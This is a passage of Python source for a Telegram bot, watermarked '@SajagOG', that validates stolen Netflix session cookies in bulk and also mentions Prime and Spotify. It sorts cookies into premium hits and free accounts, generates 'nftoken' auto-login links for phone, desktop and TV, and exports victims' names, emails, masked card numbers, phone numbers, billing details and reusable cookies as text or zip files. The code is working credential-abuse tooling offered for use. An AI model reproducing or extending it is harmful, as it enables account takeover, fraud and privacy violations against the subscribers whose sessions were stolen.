                caption=f"✅ <b>Cleaned!</b>\n📊 Found: {len(parsed)} | Unique: {len(unique)} | Valid: {valid}\n{WATERMARK}",
                parse_mode='HTML')
        else:
            await context.bot.send_message(chat_id, "❌ No valid Netflix cookies after cleaning!", parse_mode='HTML')
        await progress_msg.delete()
    except Exception as e:
        await progress_msg.edit_text(f"<b>🧹 Error:</b> {str(e)}", parse_mode='HTML')

async def process_cookies(chat_id, cookies, user_id, context, mode):
    checked, hits, fails, free = 0, 0, 0, 0
    total = len(cookies)
    
    mode_text = {"check": "🔍 Account Check", "nftoken": "🔑 NF Token Generation"}.get(mode, mode)
    
    progress_msg = await context.bot.send_message(chat_id,
        f"<b>{mode_text}</b>\n<code>{'○'*dot_length}</code>  0/{total}\n" + 
        ("Hits: <b>0</b> | Free: <b>0</b> | Fails: <b>0</b>" if mode == 'check' else "Tokens: <b>0</b> | Failed: <b>0</b>"),
        parse_mode='HTML', reply_markup=STOP_MARKUP)
    
    preview_msg = await context.bot.send_message(chat_id, "<b>📋 Preview will appear here...</b>", parse_mode='HTML')
    
    if user_id not in user_executors:
        user_executors[user_id] = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    executor = user_executors[user_id]
    
    live_hits = OrderedDict()
    user_state[user_id]['live_hits'] = live_hits
    user_state[user_id]['hits_tmp'] = tempfile.mktemp(prefix="nf_")
    
    try:
        with open(user_state[user_id]['hits_tmp'], "w", encoding='utf-8') as ftmp:
            for batch_start in range(0, total, BATCH_SIZE):
                batch = cookies[batch_start:batch_start + BATCH_SIZE]
                
                if user_state.get(user_id, {}).get('stop'):
                    break

                loop = asyncio.get_running_loop()
                futures = []
                for nm, ck in batch:
                    fn = generate_nftoken if mode == 'nftoken' else check_netflix_cookie
                    futures.append(asyncio.wait_for(loop.run_in_executor(executor, fn, ck), timeout=35))
                
                try:
                    results = await asyncio.gather(*futures, return_exceptions=True)
                except asyncio.CancelledError:
                    break
                
                if user_state.get(user_id, {}).get('stop'):
                    break
                
                for i, result in enumerate(results):
                    checked += 1
                    
                    if isinstance(result, Exception):
                        fails += 1
                        continue
                    
                    if mode == 'nftoken':
                        td, err = result
                        if td:
                            hits += 1
                            live_hits[f"Token_{hits}"] = {'token_info': td, 'source': batch[i][0]}
                            if len(live_hits) > MAX_LIVE_HITS:
                                live_hits.popitem(last=False)
                            ftmp.write(json.dumps({'token': td['token'], 'expires': td['expires']}) + "\n")
                            ftmp.flush()
                        else:
                            fails += 1
                    else:
                        if result.get("ok"):
                            if result.get("premium"):
                                hits += 1
                                live_hits[f"Hit_{hits}"] = result
                                if len(live_hits) > MAX_LIVE_HITS:
                                    live_hits.popitem(last=False)
                                ftmp.write(json.dumps(result, default=str) + "\n")
                                ftmp.flush()
                            else:
                                free += 1
                        else:
                            fails += 1

                dd = min(dot_length, checked * dot_length // total) if total > 0 else dot_length
                db = '●' * dd + '○' * (dot_length - dd)
                
                if mode == 'nftoken':
                    nt = f"<b>{mode_text}</b>\n<code>{db}</code>  {checked}/{total}\nTokens: <b>{hits}</b> | Failed: <b>{fails}</b>"
                else:
                    nt = f"<b>{mode_text}</b>\n<code>{db}</code>  {checked}/{total}\nHits: <b>{hits}</b> | Free: <b>{free}</b> | Fails: <b>{fails}</b>"
                
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=progress_msg.message_id, 
                        text=nt, parse_mode='HTML', reply_markup=STOP_MARKUP)
                except:
                    pass

                if live_hits and mode == 'check':
                    last_hit = list(live_hits.values())[-1]
                    try:
                        prev = (f"<b>Latest Hit (#{hits}):</b>\n<pre>"
                                f"Name: {scrub_text(clean_unicode(last_hit.get('name','')))}\n"
                                f"Plan: {clean_unicode(last_hit.get('plan',''))}\n"
                                f"Country: {clean_unicode(last_hit.get('country',''))}\n"
                                f"Email: {scrub_text(clean_unicode(last_hit.get('email','')))}\n"
                                f"Quality: {clean_unicode(last_hit.get('video_quality',''))}\n"
                                f"Streams: {clean_unicode(last_hit.get('max_streams',''))}\n"
                                f"Price: {clean_unicode(last_hit.get('plan_price',''))}\n</pre>")
                        await context.bot.edit_message_text(
                            chat_id=chat_id, message_id=preview_msg.message_id, 
                            text=prev, parse_mode='HTML')
                    except:
                        pass
        
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass
    finally:
        async with user_locks[user_id]:
            user_state[user_id]['busy'] = False
            user_state[user_id]['stop'] = False
            if user_id in user_executors:
                user_executors[user_id].shutdown(wait=False)
                del user_executors[user_id]
            if user_id in user_tasks:
                del user_tasks[user_id]
        
        await context.bot.send_message(chat_id, "✅ Processing complete!")
    
    if hits:
        user_state[user_id]['final_hits'] = OrderedDict(live_hits)
        msg = (f"✅ <b>Done!</b>\n\nChecked: <b>{checked}</b>\n" + 
               (f"Tokens: <b>{hits}</b> | Failed: <b>{fails}</b>" if mode == 'nftoken' 
                else f"Hits (Premium): <b>{hits}</b>\nFree: <b>{free}</b>\nFailed: <b>{fails}</b>") + 
               "\n\n<b>Select result format:</b>")
        await context.bot.send_message(chat_id, msg, parse_mode='HTML', reply_markup=RESULT_MARKUP)
    else:
        msg = (f"✅ <b>Done!</b>\n\nChecked: <b>{checked}</b>\n" +
               (f"Tokens: 0 | Failed: <b>{fails}</b>" if mode == 'nftoken'
                else f"Hits: 0\nFree: <b>{free}</b>\nFailed: <b>{fails}</b>") +
               "\n\n❌ No premium hits found.")
        await context.bot.send_message(chat_id, msg, parse_mode='HTML')

async def send_result_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('final_hits', OrderedDict())
    mode = user_state.get(user_id, {}).get('mode', 'check')
    
    if not hits:
        await query.answer("No results available!")
        return
    
    all_c = []
    tmp_path = user_state.get(user_id, {}).get('hits_tmp')
    
    if tmp_path and os.path.exists(tmp_path):
        with open(tmp_path, encoding='utf-8') as f:
            for idx, line in enumerate(f, 1):
                data = json.loads(line)
                all_c.append(build_nftoken_str_from_data(data, idx) if mode == 'nftoken' else build_export_str_from_data(data, idx))
    else:
        for idx, (nm, dd) in enumerate(hits.items(), 1):
            all_c.append(build_nftoken_str(dd, idx) if mode == 'nftoken' else build_export_str(dd, idx))
    
    buf = io.BytesIO(("\n\n".join(all_c)).encode("utf-8"))
    fn = "NF_Tokens.txt" if mode == 'nftoken' else "Netflix_Hits.txt"
    await context.bot.send_document(query.message.chat_id, 
        document=InputFile(buf, filename=fn), 
        caption=f"📄 All {len(all_c)} results\n{WATERMARK}")
    await query.answer(f"Sent {len(all_c)} results!")

async def send_result_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('final_hits', OrderedDict())
    mode = user_state.get(user_id, {}).get('mode', 'check')
    
    if not hits:
        await query.answer("No results available!")
        return
    
    buf = io.BytesIO()
    tmp_path = user_state.get(user_id, {}).get('hits_tmp')
    
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        if tmp_path and os.path.exists(tmp_path):
            with open(tmp_path, encoding='utf-8') as f:
                for idx, line in enumerate(f, 1):
                    data = json.loads(line)
                    c = build_nftoken_str_from_data(data, idx) if mode == 'nftoken' else build_export_str_from_data(data, idx)
                    zf.writestr(f"{'nftoken' if mode == 'nftoken' else 'cookie'}_{idx}_@SajagOG.txt", c)
        else:
            for idx, (nm, dd) in enumerate(hits.items(), 1):
                c = build_nftoken_str(dd, idx) if mode == 'nftoken' else build_export_str(dd, idx)
                zf.writestr(f"{'nftoken' if mode == 'nftoken' else 'cookie'}_{idx}_@SajagOG.txt", c)
    
    buf.seek(0)
    fn = "NF_Tokens.zip" if mode == 'nftoken' else "Netflix_Hits.zip"
    await context.bot.send_document(query.message.chat_id,
        document=InputFile(buf, filename=fn),
        caption=f"📦 All results as .zip\n{WATERMARK}")
    await query.answer(f"Sent!")

def build_export_str(dd, idx):
    d = [f"========== HIT #{idx} =========="]
    for key, label in [('name','Name'),('email','Email'),('country','Country'),
                        ('plan','Plan'),('plan_price','Plan Price'),('member_since','Member Since'),
                        ('next_billing','Next Billing'),('payment_method','Payment'),('masked_card','Card'),
                        ('phone','Phone'),('phone_verified','Phone Verified'),('email_verified','Email Verified'),
                        ('video_quality','Quality'),('max_streams','Streams'),('on_payment_hold','On Hold'),
                        ('extra_member','Extra Member'),('membership_status','Status'),('profiles','Profiles'),
                        ('user_guid','GUID')]:
        d.append(f"{label}: {safe_html(dd.get(key,'Unknown'))}")
    
    cd = dd.get('cookie', {})
    ns = dict_to_netscape(cd) if isinstance(cd, dict) else str(cd)
    return "\n".join(d) + "\n\nNetscape Cookie ↓\n" + ns + f"\n\n{WATERMARK}"

def build_export_str_from_data(data, idx):
    return build_export_str(data, idx)

def build_nftoken_str(dd, idx):
    ti = dd.get('token_info', {})
    return (f"========== TOKEN #{idx} ==========\n"
            f"Token: {ti.get('token','N/A')}\n"
            f"Expires: {ti.get('expires','N/A')}\n\n"
            f"📱 Phone: https://www.netflix.com/unsupported?nftoken={ti.get('token','')}\n"
            f"🖥️ Desktop: https://www.netflix.com/browse?nftoken={ti.get('token','')}\n"
            f"📺 TV: https://www.netflix.com/tv8?nftoken={ti.get('token','')}\n\n{WATERMARK}")

def build_nftoken_str_from_data(data, idx):
    return (f"========== TOKEN #{idx} ==========\n"
            f"Token: {data.get('token','N/A')}\n"
            f"Expires: {data.get('expires','N/A')}\n\n"
            f"📱 Phone: https://www.netflix.com/unsupported?nftoken={data.get('token','')}\n"
            f"🖥️ Desktop: https://www.netflix.com/browse?nftoken={data.get('token','')}\n"
            f"📺 TV: https://www.netflix.com/tv8?nftoken={data.get('token','')}\n\n{WATERMARK}")

# ==================== MAIN ====================
if __name__ == "__main__":
    os.makedirs(COOKIES_DIR, exist_ok=True)
    
    print("=" * 50)
    print("  Netflix, Prime & Spotify Multi-Tool Bot")
    print("=" * 50)
    print(f"  Vault cookies: {count_vault_cookies()}")
    print(f"  Proxies: {len(proxies_list)}")
    print(f"  Force-Join Channels: {len(FORCE_JOIN_CHANNELS)}")
    print(f"  {WATERMARK}")
    print("=" * 50)
    
    # Start Flask in a separate thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    app = ApplicationBuilder().token(TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tv", tv_command))
    app.add_handler(CommandHandler("upload", upload_command))
    app.add_handler(CommandHandler("stats", stats_command))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(platform_button, pattern="^platform_(netflix|prime|spotify)$"))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(check|nftoken|clean|tvlogin)$"))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^prime_check$"))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^spotify_check$"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
    app.add_handler(CallbackQueryHandler(get_hits, pattern="^get_hits$"))
    app.add_handler(CallbackQueryHandler(send_result_txt, pattern="^result_txt$"))
    app.add_handler(CallbackQueryHandler(send_result_zip, pattern="^result_zip$"))
    app.add_handler(CallbackQueryHandler(platform_button, pattern="^back_platform$"))
    app.add_handler(CallbackQueryHandler(verify_callback, pattern="^verify_join$"))
    
    # File handler
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))
    
    print("Bot started polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)
